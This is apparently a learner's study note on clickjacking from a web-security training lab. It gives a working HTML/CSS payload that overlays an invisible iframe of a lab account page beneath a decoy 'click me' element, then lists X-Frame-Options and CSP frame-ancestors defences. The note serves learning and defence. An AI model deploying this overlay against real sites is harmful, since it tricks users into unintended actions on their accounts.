# clickjacking (UI redesign)

> Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

```
<style>
  iframe {
    position: relative;
    width: 800px;
    height: 800px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 510px;
    left: 50px;
    z-index: 1;
  }
</style>
<div>click me</div>
<iframe src="https://xxx.web-security-academy.net/my-account"></iframe>
```

- the website would appear in the iframe but it is "invisible" but there are some buttons that are aligned with the attacked surface, if the victim clicks the fake buttons it can control the underlying website

# prevent clickjacking attacks

> `X-Frame-Options`

```
X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://normal-website.com
```

> Content Security Policy (CSP)

`Content-Security-Policy: policy`

```
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors normal-website.com;
```
